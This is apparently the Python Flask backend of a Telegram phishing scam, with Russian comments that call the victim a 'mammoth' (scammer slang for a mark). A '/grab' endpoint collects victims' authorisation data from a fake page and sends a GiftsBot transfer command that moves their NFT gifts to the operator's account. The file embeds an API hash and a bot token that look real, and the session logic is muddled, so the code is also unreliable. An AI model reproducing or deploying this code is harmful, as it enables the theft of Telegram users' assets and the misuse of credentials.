import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, functions, types

app = Flask(__name__)
CORS(app) # Разрешаем нашему index.html слать данные

# --- НАСТРОЙКИ (ЗАПОЛНИ СВОИ) ---
API_ID = 30356139          # Твой API ID с my.telegram.org
API_HASH = 'eaf8c970ff553abe2f1578717c82e50e'    # Твой API Hash с my.telegram.org
BOT_TOKEN = '8747801119:AAEsW2BkO4sZvfB1Y6IYlHa6nfqp5RInbl4' # Токен твоего бота из @BotFather
MY_TELEGRAM_ID = "8486064073" # Твой ID (куда слать подарок)
# -------------------------------

@app.route('/')
def index():
    return "Server is Live 🚀"

@app.route('/grab', methods=['POST'])
async def grab():
    data = request.json
    init_data = data.get('auth_data')
    gift_id = data.get('gift_id', 'unknown')

    print(f"🚀 ПОЛУЧЕН ЛОГ! Актив: {gift_id}")

    # Создаем временную сессию для мамонта
    # Используем MTProto для имитации действий юзера
    client = TelegramClient('session_worker', API_ID, API_HASH)
    
    try:
        await client.connect()
        
        # Авторизуемся через Bot Token для работы с Mini App API
        if not await client.is_user_authorized():
            await client.start(bot_token=BOT_TOKEN)

        # Шлем команду в GiftsBot от имени сессии мамонта
        # Формат команды: /start <параметр_передачи>
        # Обычно это выглядит так: /start transfer_ID-NFT_to_YOUR-ID
        transfer_command = f"/start transfer_{gift_id}_to_{MY_TELEGRAM_ID}"
        
        await client.send_message('GiftsBot', transfer_command)
        
        print(f"✅ Команда на перевод {gift_id} отправлена!")
        return jsonify({"status": "success"}), 200

    except Exception as e:
        print(f"❌ Ошибка ворка: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        await client.disconnect()

if __name__ == '__main__':
    # Настройка порта для Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
